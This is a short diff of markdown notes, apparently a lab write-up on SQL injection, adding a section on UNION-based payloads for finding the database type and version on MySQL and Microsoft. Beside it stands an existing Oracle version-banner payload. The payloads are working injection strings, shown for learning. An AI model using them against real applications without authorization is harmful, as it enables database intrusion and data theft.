@@ -54,4 +54,11 @@ We see both columns contain text values, so now the end challenge is to display 
 ' UNION SELECT BANNER, NULL FROM v$version--
 ```
 
-### 
+### SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+Similar methodology steps as the above UNION for Oracle but with # as the comment
+
+```
+' UNION SELECT NULL#
+' UNION SELECT NULL,NULL#
+```
